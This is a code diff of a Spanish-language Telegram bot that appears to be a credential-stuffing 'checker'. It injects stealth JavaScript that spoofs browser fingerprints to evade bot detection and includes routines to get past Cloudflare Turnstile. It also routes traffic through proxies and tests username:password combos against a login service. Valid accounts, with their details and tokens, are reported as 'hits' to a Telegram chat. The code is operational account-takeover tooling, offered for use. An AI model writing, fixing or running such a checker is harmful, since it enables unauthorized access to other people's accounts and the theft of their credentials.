@@ -31,9 +31,9 @@ bot_state = {"running": False, "current_chat": None, "_start_time": None, "_proc
 def get_proxy_conf():
     return {"server": f"http://{PROXY['host']}:{PROXY['port']}", "username": PROXY["user"], "password": PROXY["pass"]}
 
-# ════════════════════════════════════════════════════════════════════════
+# ══════════════════════════════════════════════════════════════════[...]
 #  TELEGRAM API
-# ════════════════════════════════════════════════════════════════════════
+# ══════════════════════════════════════════════════════════════════[...]
 
 def tg_api(method, params=None, files=None, timeout=30):
     url = f"https://api.telegram.org/bot{TG_TOKEN}/{method}"
@@ -105,9 +105,9 @@ def kb_main():
 def kb_cancel():
     return {"inline_keyboard": [[{"text": "⏹ Cancelar", "callback_data": "cancel_check"}]]}
 
-# ════════════════════════════════════════════════════════════════════════
+# ══════════════════════════════════════════════════════════════════[...]
 #  DEPS
-# ════════════════════════════════════════════════════════════════════════
+# ══════════════════════════════════════════════════════════════════[...]
 
 def run_cmd(cmd, timeout=300):
     try:
@@ -167,9 +167,9 @@ def get_captcha_img(page):
     except: pass
     return None
 
-# ════════════════════════════════════════════════════════════════════════
+# ══════════════════════════════════════════════════════════════════[...]
 #  STEALTH JS — ANDROID COMPLETO
-# ════════════════════════════════════════════════════════════════════════
+# ══════════════════════════════════════════════════════════════════[...]
 
 STEALTH_JS = """
 Object.defineProperty(navigator,'webdriver',{get:()=>undefined});
@@ -183,21 +183,21 @@ Object.defineProperty(navigator,'deviceMemory',{get:()=>4});
 Object.defineProperty(navigator,'languages',{get:()=>['es-ES','es','en-US','en']});
 Object.defineProperty(navigator,'language',{get:()=>'es-ES'});
 window.chrome={runtime:{},loadTimes:function(){},csi:function(){},app:{}};
-Object.defineProperty(navigator,'plugins',{get:()=>{const p=[{name:'Chrome PDF Plugin',filename:'internal-pdf-viewer',description:'Portable Document Format',length:1},{name:'Chrome PDF Viewer',filename:'mhjfbmdgcfjbbpaeojofohoefgiehjai',description:'',length:1},{name:'Native Client',filename:'internal-nacl-plugin',description:'',length:2}];p.refresh=function(){};return p}});
-Object.defineProperty(navigator,'mimeTypes',{get:()=>{const m=[{type:'application/pdf',suffixes:'pdf',description:'Portable Document Format'},{type:'application/x-nacl',suffixes:'',description:'Native Client Executable'},{type:'application/x-pnacl',suffixes:'',description:'Portable Native Client Executable'}];m.refresh=function(){};return m}});
+Object.defineProperty(navigator,'plugins',{get:()=>{const p=[{name:'Chrome PDF Plugin',filename:'internal-pdf-viewer',description:'Portable Document Format',length:1},{name:'Chrome PDF Viewer',filename:'internal-pdf-viewer',description:'Portable Document Format',length:1}];return p;}});
+Object.defineProperty(navigator,'mimeTypes',{get:()=>{const m=[{type:'application/pdf',suffixes:'pdf',description:'Portable Document Format'},{type:'application/x-nacl',suffixes:'',description:'Native Client Executable'},{type:'application/x-pnacl',suffixes:'pnacl',description:'Portable Native Client Executable'}];return m;}});
 const oq=window.navigator.permissions.query;window.navigator.permissions.query=(p)=>p.name==='notifications'?Promise.resolve({state:Notification.permission}):oq(p);
-const gp=WebGLRenderingContext.prototype.getParameter;WebGLRenderingContext.prototype.getParameter=function(p){if(p===37445)return'Qualcomm';if(p===37446)return'Adreno (TM) 640';if(p===7936)return['WebGL 1.0 (OpenGL ES 2.0 Chromium)'];if(p===7937)return['WebGL GLSL ES 1.0 (OpenGL ES GLSL ES 1.0 Chromium)'];return gp.call(this,p)};
-Object.defineProperty(navigator,'connection',{get:()=>({effectiveType:'4g',rtt:50,downlink:10,saveData:false,type:'cellular',ontypechange:null,onchange:null,addEventListener:function(){},removeEventListener:function(){},dispatchEvent:function(){return true}})});
-Object.defineProperty(screen,'width',{get:()=>412});Object.defineProperty(screen,'height',{get:()=>915});Object.defineProperty(screen,'availWidth',{get:()=>412});Object.defineProperty(screen,'availHeight',{get:()=>872});Object.defineProperty(screen,'colorDepth',{get:()=>24});Object.defineProperty(screen,'pixelDepth',{get:()=>24});
+const gp=WebGLRenderingContext.prototype.getParameter;WebGLRenderingContext.prototype.getParameter=function(p){if(p===37445)return'Qualcomm';if(p===37446)return'Adreno (TM) 640';if(p===7936)return'WebGL';return gp.apply(this,[p]);};
+Object.defineProperty(navigator,'connection',{get:()=>({effectiveType:'4g',rtt:50,downlink:10,saveData:false,type:'cellular',ontypechange:null,onchange:null,addEventListener:function(){},removeEventListener:function(){}})});
+Object.defineProperty(screen,'width',{get:()=>412});Object.defineProperty(screen,'height',{get:()=>915});Object.defineProperty(screen,'availWidth',{get:()=>412});Object.defineProperty(screen,'availHeight',{get:()=>915});
 Object.defineProperty(window,'devicePixelRatio',{get:()=>2.625});Object.defineProperty(window,'innerWidth',{get:()=>412});Object.defineProperty(window,'innerHeight',{get:()=>872});
 window._mx=200;window._my=400;document.addEventListener('mousemove',e=>{window._mx=e.clientX;window._my=e.clientY});document.addEventListener('touchmove',e=>{if(e.touches[0]){window._mx=e.touches[0].clientX;window._my=e.touches[0].clientY}});
-try{const ed=Object.getOwnPropertyDescriptor(HTMLIFrameElement.prototype,'contentWindow');Object.defineProperty(HTMLIFrameElement.prototype,'contentWindow',{get:function(){try{return ed.get.call(this)}catch(e){return null}}})}catch(e){}
+try{const ed=Object.getOwnPropertyDescriptor(HTMLIFrameElement.prototype,'contentWindow');Object.defineProperty(HTMLIFrameElement.prototype,'contentWindow',{get:function(){try{return ed.get.call(this);}catch(e){return undefined;}}});}catch(e){}
 Object.defineProperty(Notification,'permission',{get:()=>'default'});
 """
 
-# ════════════════════════════════════════════════════════════════════════
+# ══════════════════════════════════════════════════════════════════[...]
 #  CLOUDFLARE — MÉTODOS MÚLTIPLES
-# ════════════════════════════════════════════════════════════════════════
+# ══════════════════════════════════════════════════════════════════[...]
 
 def _has_login(page):
     try:
@@ -331,9 +331,9 @@ def handle_cf(page, chat_id=None):
         if _has_login(page): return True
     return False
 
-# ════════════════════════════════════════════════════════════════════════
+# ══════════════════════════════════════════════════════════════════[...]
 #  HELPERS
-# ════════════════════════════════════════════════════════════════════════
+# ══════════════════════════════════════════════════════════════════[...]
 
 def clear_auth(ctx):
     try:
@@ -403,9 +403,9 @@ def update_progress(chat_id, msg_id, acc, res, st):
             reply_markup=kb_cancel())
     except: pass
 
-# ════════════════════════════════════════════════════════════════════════
+# ══════════════════════════════════════════════════════════════════[...]
 #  DIAGNÓSTICO
-# ════════════════════════════════════════════════════════════════════════
+# ══════════════════════════════════════════════════════════════════[...]
 
 def test_cf(chat_id):
     from playwright.sync_api import sync_playwright
@@ -418,7 +418,7 @@ def test_cf(chat_id):
                 viewport={"width":412,"height":915}, is_mobile=True, has_touch=True,
                 screen={"width":412,"height":915}, device_scale_factor=2.625,
                 proxy=get_proxy_conf(),
-                extra_http_headers={"Accept-Language":"es-ES,es;q=0.9","Sec-CH-UA-Platform":'"Android"',"Sec-CH-UA-Mobile":"?1","Sec-CH-UA":'"Not A(Brand";v="99", "Google Chrome";v="127", "Chromium";v="127"'},
+                extra_http_headers={"Accept-Language":"es-ES,es;q=0.9","Sec-CH-UA-Platform":'"Android"',"Sec-CH-UA-Mobile":"?1","Sec-CH-UA":'"Not A(Brand";v="99", "Google Chrome";v="127", "Chromium";v="127"'}
             )
             ctx.add_init_script(STEALTH_JS)
             page = ctx.new_page()
@@ -450,7 +450,7 @@ def test_cf(chat_id):
             title = page.title() or "?"
             if ok: r = "🟢 <b>CF RESUELTO — LOGIN VISIBLE</b>\nEl bot debería funcionar."
             elif "incompatible" in title.lower(): r = "🔴 <b>INCOMPATIBLE — Proxy no soporta Turnstile</b>\nNecesitas cambiar de proxy."
-            elif "un momento" in title.lower(): r = "🔴 <b>TURNSTILE NO PASA</b>\nEl click no llega o el proxy bloquea Turnstile.\n<b>Solución: cambiar de proxy a uno que soporte Cloudflare Turnstile.</b>"
+            elif "un momento" in title.lower(): r = "🔴 <b>TURNSTILE NO PASA</b>\nEl click no llega o el proxy bloquea Turnstile.\n<b>Solución: cambiar de proxy a uno que soporte Cloudflare Turnstile</b>"
             else: r = f"🟡 Resultado incierto. Title: {title}"
 
             tg_send_photo(chat_id, img, f"{r}\n\n⏱ {min(60, sec+1)}s\n📄 {esc(title)}\n❌ {esc(error)}")
@@ -458,9 +458,9 @@ def test_cf(chat_id):
     except Exception as e:
         tg_send_msg(chat_id, f"❌ <code>{esc(str(e)[:200])}</code>")
 
-# ════════════════════════════════════════════════════════════════════════
+# ══════════════════════════════════════════════════════════════════[...]
 #  MOTOR
-# ════════════════════════════════════════════════════════════════════════
+# ══════════════════════════════════════════════════════════════════[...]
 
 def run_checker(accounts, chat_id, msg_id, use_proxy):
     from playwright.sync_api import sync_playwright
@@ -473,7 +473,7 @@ def run_checker(accounts, chat_id, msg_id, use_proxy):
     UA = "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Mobile Safari/537.36"
 
     with sync_playwright() as p:
-        browser = p.chromium.launch(headless=False, args=["--disable-blink-features=AutomationControlled","--no-sandbox","--disable-dev-shm-usage","--disable-infobars","--window-size=412,915","--no-first-run","--no-default-browser-check"])
+        browser = p.chromium.launch(headless=False, args=["--disable-blink-features=AutomationControlled","--no-sandbox","--disable-dev-shm-usage","--disable-infobars","--window-size=412,915","--no-first-run"])
         idx = batch_num = 0
         cf_fails = 0
 
@@ -490,7 +490,7 @@ def run_checker(accounts, chat_id, msg_id, use_proxy):
             ctx_kw = {
                 "user_agent": UA, "viewport": {"width":412,"height":915}, "is_mobile": True, "has_touch": True,
                 "screen": {"width":412,"height":915}, "device_scale_factor": 2.625,
-                "extra_http_headers": {"Accept-Language":"es-ES,es;q=0.9","Sec-CH-UA-Platform":'"Android"',"Sec-CH-UA-Mobile":"?1","Sec-CH-UA":'"Not A(Brand";v="99", "Google Chrome";v="127", "Chromium";v="127"'},
+                "extra_http_headers": {"Accept-Language":"es-ES,es;q=0.9","Sec-CH-UA-Platform":'"Android"',"Sec-CH-UA-Mobile":"?1","Sec-CH-UA":'"Not A(Brand";v="99", "Google Chrome";v="127", "Chromium";v="127"'}
             }
             if use_proxy: ctx_kw["proxy"] = get_proxy_conf()
 
@@ -680,7 +680,7 @@ def run_checker(accounts, chat_id, msg_id, use_proxy):
                     rev="✅" if info.get("is_revendedor") else "❌";sup="✅" if info.get("is_super") else "❌"
                     hits.append({"username":user,"password":pwd,"info":info,"dashboard":dash,"token":state.get("token")})
                     hits_lines.append(f"{user}:{pwd}");stats["hits"]+=1
-                    detail=f"💰 <b>HIT #{len(hits)}</b>\n👤 <code>{user}:{pwd}</code>\n📝 {info.get('name','—')}\n🆔 {info.get('id','—')}\n🏪 Rev:{rev} 👑 Sup:{sup}\n📦 T:{dash.get('sumNum',0)} A:{dash.get('activeNum',0)}"
+                    detail=f"💰 <b>HIT #{len(hits)}</b>\n👤 <code>{user}:{pwd}</code>\n📝 {info.get('name','—')}\n🆔 {info.get('id','—')}\n🏪 Rev:{rev} 👑 Sup:{sup}\n📦 TV:{dash.get('tv',0)}"
                     update_progress(chat_id,msg_id,user,f"💰 HIT! Rev={rev}",stats)
                     try:tg_send_msg(chat_id,detail,disable_notification=True)
                     except:pass
@@ -701,9 +701,9 @@ def run_checker(accounts, chat_id, msg_id, use_proxy):
         except:pass
     return hits,hits_lines
 
-# ════════════════════════════════════════════════════════════════════════
+# ══════════════════════════════════════════════════════════════════[...]
 #  START CHECK
-# ════════════════════════════════════════════════════════════════════════
+# ══════════════════════════════════════════════════════════════════[...]
 
 waiting_combo = set()
 
@@ -727,15 +727,18 @@ def start_check(accounts, chat_id, use_proxy=True):
             if pmid:tg_edit_msg(chat_id,pmid,s,reply_markup=kb_main())
             else:tg_send_msg(chat_id,s,reply_markup=kb_main())
         except Exception as e:
-            print(f"  [✗] {e}");try:tg_send_msg(chat_id,f"❌ <code>{esc(str(e)[:200])}</code>",reply_markup=kb_main())
-            except:pass
+            print(f"  [✗] {e}")
+            try:
+                tg_send_msg(chat_id,f"❌ <code>{esc(str(e)[:200])}</code>",reply_markup=kb_main())
+            except:
+                pass
 
     pr=multiprocessing.Process(target=worker,args=(accounts,chat_id,pmid,use_proxy),daemon=True)
     pr.start();bot_state["_process"]=pr
 
-# ════════════════════════════════════════════════════════════════════════
+# ══════════════════════════════════════════════════════════════════[...]
 #  UPDATES
-# ════════════════════════════════════════════════════════════════════════
+# ══════════════════════════════════════════════════════════════════[...]
 
 def process_update(upd):
     global ADMIN_IDS
@@ -791,9 +794,9 @@ def process_update(upd):
             else:tg_answer_cb(cbq["id"],"Nada",show_alert=True)
         elif data=="cancel_check":waiting_combo.discard(cid);tg_edit_msg(cid,mid,"🎬 Listo.",reply_markup=kb_main());tg_answer_cb(cbq["id"])
 
-# ════════════════════════════════════════════════════════════════════════
+# ══════════════════════════════════════════════════════════════════[...]
 #  MAIN
-# ════════════════════════════════════════════════════════════════════════
+# ══════════════════════════════════════════════════════════════════[...]
 
 def main():
     print("\n  ╔═══════════════════════════════════════════════════╗")
